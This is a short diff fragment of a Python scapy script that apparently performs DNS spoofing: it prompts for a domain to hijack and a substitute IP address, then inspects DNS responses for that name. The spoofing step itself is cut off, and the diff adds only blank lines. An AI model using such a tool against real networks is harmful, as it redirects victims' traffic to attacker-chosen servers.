@@ -15,7 +15,9 @@ import scapy.all as scapy
 def process_packet(packet):
     host = input('Please enter a host or domain to highjack: ')
     IP_address = input('Enter IP address to substitute for the host: ')
+
     scapy_packet = scapy.IP(packet.get_payload())
+
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
         if host in qname:
